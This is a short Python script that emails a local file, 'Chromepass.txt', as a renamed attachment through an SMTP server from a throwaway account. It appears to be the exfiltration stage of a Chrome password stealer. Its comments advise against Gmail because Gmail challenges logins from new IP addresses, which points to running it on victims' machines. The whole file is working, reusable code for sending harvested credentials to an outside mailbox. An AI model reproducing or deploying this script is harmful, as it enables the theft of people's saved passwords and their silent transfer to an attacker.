
import smtplib
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase

# Pretty straight forward, sending e-mail over SMTP. I have made a dummy account for this.
fromaddr = "from@mail.com"
toaddr = "your@mail.com"

msg = MIMEMultipart()

msg['From'] = fromaddr
msg['To'] = toaddr
msg['Subject'] = "Pick a subject for the email"

body = "This is the body message"

msg.attach(MIMEText(body, 'plain'))

filename = "File.txt"  # The filename it will have, you can comment this out
attachment = open("./Chromepass.txt", "rb")  #

part = MIMEBase('application', 'octet-stream')
part.set_payload((attachment).read())
part.add_header('Content-Disposition', "attachment; filename= %s" % filename)

msg.attach(part)

server = smtplib.SMTP('smtp.gmail.com:587') #Just ran into this while debugging, make sure you dont use google for the SMTP , as gmail requires auth once youre in a new IP, pick some other random server
server.starttls()
server.login(fromaddr, "passwords")
text = msg.as_string()
server.sendmail(fromaddr, toaddr, text)
server.quit()
